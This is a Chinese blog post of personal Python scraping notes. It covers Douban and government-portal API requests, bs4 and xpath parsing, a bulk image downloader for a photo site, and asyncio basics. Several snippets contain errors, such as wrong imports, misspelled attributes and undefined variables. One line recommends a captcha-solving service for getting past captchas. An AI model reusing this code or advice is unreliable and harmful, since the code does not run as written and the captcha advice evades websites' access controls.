27],</span></span><br><span class="line"><span class="string"> [&#x27;剧情&#x27;, &#x27;爱情&#x27;, &#x27;家庭&#x27;, 28], [&#x27;爱情&#x27;, &#x27;奇幻&#x27;, &#x27;武侠&#x27;, &#x27;古装&#x27;, 29], [&#x27;剧情&#x27;, &#x27;动画&#x27;, &#x27;奇幻&#x27;, &#x27;古装&#x27;, 30], [&#x27;剧情&#x27;, &#x27;黑色电影&#x27;, 31]]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">type</span> = <span class="built_in">input</span>(<span class="string">&quot;你要什么类型的电影&quot;</span>)</span><br><span class="line">num = <span class="built_in">input</span>(<span class="string">&quot;你要几部这样的电影，按照评分排序&quot;</span>)</span><br><span class="line">url = <span class="string">&#x27;https://movie.douban.com/j/chart/top_list?&#x27;</span></span><br><span class="line"><span class="comment">#记住参数要封装在字典中</span></span><br><span class="line">param = &#123;<span class="string">&#x27;type&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">type</span>&#125;</span>&#x27;</span>,<span class="comment">#电影的种类</span></span><br><span class="line">        <span class="string">&#x27;interval_id&#x27;</span>:<span class="string">&#x27;100:90&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;action&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;start&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,<span class="comment">#分析一下我们知道是从第几个电影开始取</span></span><br><span class="line">        <span class="string">&#x27;limit&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;num&#125;</span>&#x27;</span>&#125;<span class="comment">#限制取几个电影</span></span><br><span class="line"></span><br><span class="line">handers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.69&#x27;</span>&#125;</span><br><span class="line">res = requests.get(url,headers=handers,params=param)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">int</span>(num)):</span><br><span class="line">    <span class="built_in">print</span>(res.json()[item].get(<span class="string">&#x27;title&#x27;</span>),res.json()[item].get(<span class="string">&#x27;url&#x27;</span>))</span><br><span class="line"><span class="comment">#with open(&#x27;./恐怖电影.json&#x27;,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as fp:</span></span><br><span class="line"> <span class="comment">#   json.dump(res.json(),fp=fp,ensure_ascii=False)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[[&#x27;纪录片&#x27;, &#x27;音乐&#x27;, 1], [&#x27;剧情&#x27;, &#x27;传记&#x27;, &#x27;历史&#x27;, 2], [&#x27;犯罪&#x27;, &#x27;剧情&#x27;, 3], [&#x27;剧情&#x27;, &#x27;历史&#x27;, &#x27;战争&#x27;, 4], [&#x27;喜剧&#x27;, &#x27;动作&#x27;, &#x27;爱情&#x27;, 5], [&#x27;剧情&#x27;, &#x27;战争&#x27;, &#x27;情色&#x27;, 6], [&#x27;剧情&#x27;, &#x27;歌舞&#x27;, 7]]</span></span><br><span class="line"><span class="comment">#[[&#x27;剧情&#x27;, &#x27;犯罪&#x27;, &#x27;悬疑&#x27;, 10], [&#x27;犯罪&#x27;, &#x27;剧情&#x27;, 11], [&#x27;剧情&#x27;, &#x27;爱情&#x27;, &#x27;灾难&#x27;, 12], [&#x27;剧情&#x27;, &#x27;爱情&#x27;, &#x27;同性&#x27;, 13], [&#x27;音乐&#x27;, 14], [&#x27;剧情&#x27;, &#x27;科幻&#x27;, &#x27;冒险&#x27;, 15],</span></span><br><span class="line"><span class="comment"># [&#x27;剧情&#x27;, &#x27;动画&#x27;, &#x27;奇幻&#x27;, 16], [&#x27;剧情&#x27;, &#x27;科幻&#x27;, &#x27;冒险&#x27;, 17], [&#x27;运动&#x27;, 18], [&#x27;剧情&#x27;, &#x27;犯罪&#x27;, &#x27;惊悚&#x27;, 19]],[[&#x27;悬疑&#x27;, &#x27;惊悚&#x27;, &#x27;恐怖&#x27;, 20]]</span></span><br><span class="line"><span class="comment">#[[&#x27;剧情&#x27;, &#x27;喜剧&#x27;, &#x27;爱情&#x27;, &#x27;战争&#x27;, 22], [&#x27;科幻&#x27;, &#x27;动画&#x27;, &#x27;短片&#x27;, 23], [&#x27;剧情&#x27;, &#x27;喜剧&#x27;, &#x27;爱情&#x27;, &#x27;战争&#x27;, 24], [&#x27;剧情&#x27;, &#x27;动画&#x27;, &#x27;奇幻&#x27;, 25], [&#x27;剧情&#x27;, &#x27;爱情&#x27;, &#x27;同性&#x27;, 26], [&#x27;冒险&#x27;, &#x27;西部&#x27;, 27],6.</span></span><br><span class="line"><span class="comment"># [&#x27;剧情&#x27;, &#x27;爱情&#x27;, &#x27;家庭&#x27;, 28], [&#x27;爱情&#x27;, &#x27;奇幻&#x27;, &#x27;武侠&#x27;, &#x27;古装&#x27;, 29], [&#x27;剧情&#x27;, &#x27;动画&#x27;, &#x27;奇幻&#x27;, &#x27;古装&#x27;, 30], [&#x27;剧情&#x27;, &#x27;黑色电影&#x27;, 31]]</span></span><br></pre></td></tr></table></figure>

<h3 id="综合：国家药品监督管理总局中基于中华人民共各国化妆品生产许可相关数据（动态加载）"><a href="#综合：国家药品监督管理总局中基于中华人民共各国化妆品生产许可相关数据（动态加载）" class="headerlink" title="综合：国家药品监督管理总局中基于中华人民共各国化妆品生产许可相关数据（动态加载）"></a>综合：国家药品监督管理总局中基于中华人民共各国化妆品生产许可相关数据（动态加载）</h3><p>首先我们发现这下面的数据都是阿贾克斯数据包动态加载出来的</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220122191903352.png" alt="image-20220122191903352"></p>
<p>然后每一个公司的详细信息也是动态加载出来的</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220122204100206.png" alt="image-20220122204100206"></p>
<p>那就可以开始写代码了，主要思路就是拼接url上的id</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">page = <span class="built_in">input</span>(<span class="string">&quot;请输入你要爬取第几页的信息:  &quot;</span>)</span><br><span class="line">handers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.69&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsList&#x27;</span></span><br><span class="line">param = &#123;</span><br><span class="line"><span class="string">&#x27;method&#x27;</span>: <span class="string">&#x27;getXkzsList&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;on&#x27;</span>: <span class="string">&#x27;true&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;page&#x27;</span>: <span class="string">f&#x27;<span class="subst">&#123;page&#125;</span>&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pageSize&#x27;</span>: <span class="string">&#x27;15&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;productName&#x27;</span>:<span class="string">&#x27;&#x27;</span> ,</span><br><span class="line"><span class="string">&#x27;conditionType&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;applyname&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;applysn&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#首先获取公司和他们的id</span></span><br><span class="line">res = requests.post(url,headers=handers)</span><br><span class="line">name_id = <span class="built_in">dict</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res.json().get(<span class="string">&#x27;list&#x27;</span>))):</span><br><span class="line">    <span class="built_in">id</span> = res.json().get(<span class="string">&#x27;list&#x27;</span>)[i].get(<span class="string">&#x27;ID&#x27;</span>)</span><br><span class="line">    name = res.json().get(<span class="string">&#x27;list&#x27;</span>)[i].get(<span class="string">&#x27;EPS_NAME&#x27;</span>)</span><br><span class="line">    name_id[name] = <span class="built_in">id</span></span><br><span class="line"><span class="keyword">for</span> index,item <span class="keyword">in</span> <span class="built_in">enumerate</span>(name_id.keys()):</span><br><span class="line">    <span class="built_in">print</span>(index,item)</span><br><span class="line"></span><br><span class="line"><span class="comment">#问要看哪个公司的信息</span></span><br><span class="line">company = <span class="built_in">input</span>(<span class="string">&quot;你想看哪个公司的信息，请输入那个公司的名字，懒得输请自己复制，序号功能太难弄了： &quot;</span>)</span><br><span class="line">param2 = &#123;</span><br><span class="line"><span class="string">&#x27;method&#x27;</span>: <span class="string">&#x27;getXkzsById&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;id&#x27;</span>: name_id.get(<span class="string">f&#x27;<span class="subst">&#123;company&#125;</span>&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res2 = requests.post(<span class="string">&#x27;http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do&#x27;</span>,headers=handers,params=param2)</span><br><span class="line"><span class="built_in">print</span>(res2.json())</span><br></pre></td></tr></table></figure>

<h1 id="2-数据解析"><a href="#2-数据解析" class="headerlink" title="2.数据解析"></a>2.数据解析</h1><p>聚焦爬虫：爬取页面中指定的页面内容</p>
<p>数据解析分类：</p>
<p>·正则</p>
<p>·bs4</p>
<p>·xpath（重点）</p>
<p>数据解析原理概述：</p>
<p>​    解析的局部的文本内容都会在标签之间或者标签对应的属性中进行存储</p>
<p>​    进行指定标签的定位</p>
<p>​    标签或者标签对应属性中存储的数据值进行提取，这个过程就叫解析。</p>
<h2 id="2-1使用正则来进行数据解析"><a href="#2-1使用正则来进行数据解析" class="headerlink" title="2.1使用正则来进行数据解析"></a>2.1使用正则来进行数据解析</h2><p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220122213157511.png" alt="image-20220122213157511"></p>
<h2 id="2-2bs4解析（python独有的方式）"><a href="#2-2bs4解析（python独有的方式）" class="headerlink" title="2.2bs4解析（python独有的方式）"></a>2.2bs4解析（python独有的方式）</h2><p>bs4数据解析的原理：</p>
<p>1.实例化一个BeautifuSoup的对象，并且将页面源码数据加载到该对象中。</p>
<p>2.通过调用BeautifuSoup对象中相关的属性或者方法进行标签定位和数据提取。</p>
<p><code>pip install bs4</code></p>
<h3 id="2-2-1示例：实例化BeautifulSoup"><a href="#2-2-1示例：实例化BeautifulSoup" class="headerlink" title="2.2.1示例：实例化BeautifulSoup"></a>2.2.1示例：实例化BeautifulSoup</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;./test.thml&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">soup = BeautifulSoup(fp,<span class="string">&#x27;lxml&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>示例二：将互联网上获取的页面源码加载到该对象中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">page_text = page.taxt</span><br><span class="line">soup = BeautifulSoup(page_text,<span class="string">&#x27;lxml&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="2-2-2相关方法和属性"><a href="#2-2-2相关方法和属性" class="headerlink" title="2.2.2相关方法和属性"></a>2.2.2相关方法和属性</h3><p><a href="https://www.cnblogs.com/Crush999/p/11921495.html">beautifulSoup常用方法 - Crush999 - 博客园 (cnblogs.com)</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">soup.a<span class="comment">#获取其中的a标签，只获取第一个 soup.tagName,返回第一次出现的那个标签</span></span><br><span class="line">soup.find(<span class="string">&#x27;a&#x27;</span>):<span class="comment">#返回a标签的值</span></span><br><span class="line">soup.find(<span class="string">&#x27;div&#x27;</span>,class_=<span class="string">&#x27;abc&#x27;</span>)<span class="comment">#返回属性是abc的biv标签</span></span><br><span class="line">soup.find_all(<span class="string">&#x27;div&#x27;</span>)<span class="comment">#返回所有的标签是div的标签，就是返回符合标准的所有标签。（列表）</span></span><br><span class="line"></span><br><span class="line">soup.select(<span class="string">&#x27;.asd&#x27;</span>)<span class="comment">#这里面的.是类选择器，这个select函数里面装选择器，返回复合条件的标签（列表）</span></span><br><span class="line">soup.select(<span class="string">&#x27;.asd &gt; url &gt; a&#x27;</span>)[<span class="number">2</span>]<span class="comment">#定位asd类下的url标签中的a标签，返回的是列表，想要哪个标签就用列表的索引。&gt;表示的是一个层级</span></span><br><span class="line">soup.select(<span class="string">&#x27;.asd &gt; url a&#x27;</span>)<span class="comment">#空格表示的是多个层级</span></span><br><span class="line"></span><br><span class="line">soup.a.text/string/get_text()<span class="comment">#后面三个都是获取a标签中的的文本内容的意思</span></span><br><span class="line">text/get_text()<span class="comment">#可以获取某一个标签中所有的文本内容</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="2-3xpath解析"><a href="#2-3xpath解析" class="headerlink" title="2.3xpath解析"></a>2.3xpath解析</h2><p>是最常用最便携的高效解析方式</p>
<p>解析原理：</p>
<p>实例化 etree对象，且需要将被解析的页面源码加载到该对象中。</p>
<p>调用etree对象中的xpath方法结合着xpath表达式实现标签的定位和内容的捕获</p>
<p><code>pip install lxml</code></p>
<p>实例化对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">form lxml <span class="keyword">import</span> etree</span><br><span class="line">tree = etree.parse(filePath)</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">tree = etree.HTML(<span class="string">&#x27;page_text&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="2-3-1常用xpath表达式"><a href="#2-3-1常用xpath表达式" class="headerlink" title="2.3.1常用xpath表达式"></a>2.3.1常用xpath表达式</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tree.xpath(<span class="string">&#x27;/html/head/title&#x27;</span>)<span class="comment">#在html标签中找head标签中找title标签。返回一个列表，element类型的对象。如果是两个//那就是多个层级</span></span><br><span class="line">上面的表达式就是也可以表示成这样</span><br><span class="line"><span class="comment">#tree.xpath(&#x27;/html//title&#x27;)</span></span><br><span class="line"><span class="comment">#tree.xpath(&#x27;//title&#x27;)这个表示源码中所有的title标签，从任意位置开始定位。</span></span><br><span class="line"></span><br><span class="line">r = tree.xpath(<span class="string">&#x27;//title[@class = &quot;song&quot;]&#x27;</span>)<span class="comment">#实现属性定位</span></span><br><span class="line">r = tree.xpath(<span class="string">&#x27;//title[@class = &quot;song&quot;]/p[3]&#x27;</span>)<span class="comment">#实现索引定位，他这个索引是从一开始的，ε=(´ο｀*)))唉，能不能统一一下啊。注意那个p是标签名字</span></span><br><span class="line"></span><br><span class="line">tree.xpath(<span class="string">&#x27;/html//title/text()&#x27;</span>)<span class="comment">#就可以取到文本内容，返回的是一个列表</span></span><br><span class="line">tree.xpath(<span class="string">&#x27;/html//title//text()&#x27;</span>)<span class="comment">#就可以取到里面所有的文本内容，返回的是一个列表</span></span><br><span class="line">tree.xpath(<span class="string">&#x27;/html//title/@属性名&#x27;</span>)<span class="comment">#取属性</span></span><br><span class="line"></span><br><span class="line">注意在表达式中用|管道符表示或者</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup<span class="comment">#导入模块</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;https://www.unjs.com/lunwen/f/20191111001204_2225087.html&quot;</span></span><br><span class="line">headers= &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36 Edg/87.0.664.47&quot;</span></span><br><span class="line">&#125;<span class="comment">#模拟的服务器头</span></span><br><span class="line"></span><br><span class="line">html = requests.get(url,headers=headers)</span><br><span class="line">page.encoding = <span class="string">&#x27;utf-8&#x27;</span><span class="comment">#防止乱码</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/zhuochuyu7096/article/details/80085321">(36条消息) scrapy爬取小说时换行问题_Keyu-CSDN博客_python爬小说换行</a></p>
<p>验证码绕过的时候就用云打码平台</p>
<p>实例，爬取图片，还有个爬小说的我就不放出来了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;米娜这个东西要开全局代理才能看呢！&quot;</span>)</span><br><span class="line">handers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.69&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    page = <span class="built_in">input</span>(<span class="string">&quot;大家好越江又来送好东西了，这次是图片哦，每一页有三十四个系列的图片，最多八十页哦！请输入您要的页数： &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(page) &gt; <span class="number">80</span> <span class="keyword">or</span> <span class="built_in">int</span>(page) &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;不要就不要，乱输什么数字啊！&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;好东西2&quot;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;正在爬取网址&#x27;</span>)</span><br><span class="line">    os.makedirs(<span class="string">&#x27;好东西2&#x27;</span>)</span><br><span class="line">    pic_dict = <span class="built_in">dict</span>()</span><br><span class="line">    <span class="keyword">for</span> pagex <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">int</span>(page) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = <span class="string">f&#x27;http://www.52rosi.com/?action=ajax_post&amp;pag=<span class="subst">&#123;pagex&#125;</span>&#x27;</span></span><br><span class="line">            res = requests.get(url,headers=handers)</span><br><span class="line">            res.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">            page_text = res.text</span><br><span class="line">            tree = etree.HTML(page_text)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;pagex / <span class="built_in">int</span>(page) * <span class="number">100</span>&#125;</span>%...正在爬取网址&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">                pic_nam = tree.xpath(<span class="string">f&#x27;//div[@class=&quot;post-home&quot;][<span class="subst">&#123;index&#125;</span>]//span/a/@title&#x27;</span>)</span><br><span class="line">                pic_name = pic_nam[<span class="number">0</span>].replace(<span class="string">&quot;上的评论&quot;</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                pic_url = tree.xpath(<span class="string">f&#x27;//div[@class=&quot;post-home&quot;][<span class="subst">&#123;index&#125;</span>]//span/a/@href&#x27;</span>)</span><br><span class="line">                pic_dict[pic_name] = pic_url[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;第<span class="subst">&#123;page&#125;</span>页出错了&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(res.status_code)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./好东西2/各个网址.txt&#x27;</span>,mode=<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(<span class="built_in">str</span>(pic_dict))</span><br><span class="line"></span><br><span class="line">    tip = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> item_name,item_url <span class="keyword">in</span> pic_dict.items():</span><br><span class="line">        tip += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;tip / <span class="built_in">len</span>(pic_dict.keys()) * <span class="number">100</span>&#125;</span>%正在帮你下载图片&quot;</span>)</span><br><span class="line">        os.makedirs(<span class="string">f&#x27;./好东西2/<span class="subst">&#123;item_name&#125;</span>&#x27;</span>)</span><br><span class="line">        res = requests.get(item_url,headers=handers)</span><br><span class="line">        tree = etree.HTML(res.text)</span><br><span class="line">        url_list = tree.xpath(<span class="string">&#x27;//div[@id=&quot;wrap&quot;]//dt[@class=&quot;gallery-icon&quot;]/a/@href&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> index,urlx <span class="keyword">in</span> <span class="built_in">enumerate</span>(url_list):</span><br><span class="line"></span><br><span class="line">            res = requests.get(urlx, headers=handers)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;./好东西2/<span class="subst">&#123;item_name.strip()&#125;</span>/<span class="subst">&#123;index&#125;</span>.jpg&quot;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(res.content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;把当前目录下的“好东西”文件夹删了，我才好给你资源啊！&quot;</span>)</span><br></pre></td></tr></table></figure>



<h1 id="3-高性能异步爬虫"><a href="#3-高性能异步爬虫" class="headerlink" title="3.高性能异步爬虫"></a>3.高性能异步爬虫</h1><h2 id="3-1异步爬虫的方式"><a href="#3-1异步爬虫的方式" class="headerlink" title="3.1异步爬虫的方式"></a>3.1异步爬虫的方式</h2><p>·多线程，多进程（不建议）</p>
<p>·线程池，进程池（建议）</p>
<p>下面线程池的使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># 导入线程池所对应的类</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="comment">#模拟下载</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在下载&quot;</span>, <span class="built_in">str</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;下载成功&quot;</span>, <span class="built_in">str</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    listx = [<span class="string">&#x27;aa&#x27;</span>,<span class="string">&#x27;ss&#x27;</span>,<span class="string">&#x27;vv&#x27;</span>,<span class="string">&#x27;bb&#x27;</span>]</span><br><span class="line">    <span class="comment">#实例化一个线程池对象</span></span><br><span class="line">    pool = Pool(<span class="number">4</span>)<span class="comment">#创建了四个线程</span></span><br><span class="line">    <span class="comment">#将列表中每一个元素传递个get</span></span><br><span class="line">    pool.<span class="built_in">map</span>(get_page,listx)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://www.freesion.com/article/740970388/">pytorch使用出现”RuntimeError: An attempt has been made to start a new process before the…” 解决方法 - 灰信网（软件开发博客聚合） (freesion.com)</a></p>
<p><a href="https://www.cnblogs.com/liuzhzhao/p/12114453.html">Python中用requests处理cookies的3种方法 - 王昭君的昭 - 博客园 (cnblogs.com)</a></p>
<h2 id="3-2单线程加异步协程"><a href="#3-2单线程加异步协程" class="headerlink" title="3.2单线程加异步协程"></a>3.2单线程加异步协程</h2><h3 id="3-2-1基本概念"><a href="#3-2-1基本概念" class="headerlink" title="3.2.1基本概念"></a>3.2.1基本概念</h3><p><a href="https://blog.csdn.net/weixin_41599977/article/details/93656042">(36条消息) python多任务—协程（一）_夜风晚凉的博客-CSDN博客_python 协程</a></p>
<p>event_loop:事件循环</p>
<p>coroutine:协程对象</p>
<p>task:任务</p>
<p>future:代表将来执行或还没有执行的任务，实际上和没有本质区别</p>
<p>asunc:定义一个协程</p>
<p>await:用来挂起阻塞方法的执行。</p>
<h3 id="3-2-2相关操作"><a href="#3-2-2相关操作" class="headerlink" title="3.2.2相关操作"></a>3.2.2相关操作</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">request</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;正在请求的url是<span class="subst">&#123;url&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;请求成功&#x27;</span>)</span><br><span class="line"><span class="comment">#async修饰的函数，调用之后返回的一个协程对象</span></span><br><span class="line"></span><br><span class="line">c = request(<span class="string">&#x27;www.baidu.com&#x27;</span>)</span><br><span class="line"><span class="comment">#创建一个事件循环对象</span></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line"><span class="comment">#将协程对象注册到loop中，然后启动loop</span></span><br><span class="line">loop.run_until_complete(c)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">正在请求的url是www.baidu.com</span></span><br><span class="line"><span class="string">请求成功</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">request</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;正在请求的url是<span class="subst">&#123;url&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;请求成功&#x27;</span>)</span><br><span class="line"><span class="comment">#async修饰的函数，调用之后返回的一个协程对象</span></span><br><span class="line"><span class="comment">#task的使用</span></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line"><span class="comment">#基于loop创建了一个task任务对象</span></span><br><span class="line">task = loop.create_task(c)</span><br><span class="line"><span class="built_in">print</span>(task)<span class="comment">#还没有被执行</span></span><br><span class="line"></span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line"><span class="built_in">print</span>(task)<span class="comment">#被执行了</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#future的使用</span></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">task = asyncio.ensure_future(c)</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line"><span class="built_in">print</span>(task)</span><br></pre></td></tr></table></figure>

<p>绑定回调</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">request</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;正在请求的url是<span class="subst">&#123;url&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;请求成功&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"><span class="comment">#async修饰的函数，调用之后返回的一个协程对象</span></span><br><span class="line">c = request(<span class="string">&#x27;www.baidu.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">callback_func</span>(<span class="params">task</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(task.result())<span class="comment">#result函数返回执行函数的返回值</span></span><br><span class="line"><span class="comment">#绑定回调</span></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">task = asyncio.ensure_future(c)</span><br><span class="line"><span class="comment">#将回调函数绑定到任务对象中</span></span><br><span class="line">task.add_done_callback(callback_func)</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">正在请求的url是www.baidu.com</span></span><br><span class="line"><span class="string">请求成功</span></span><br><span class="line"><span class="string">www.baidu.com</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

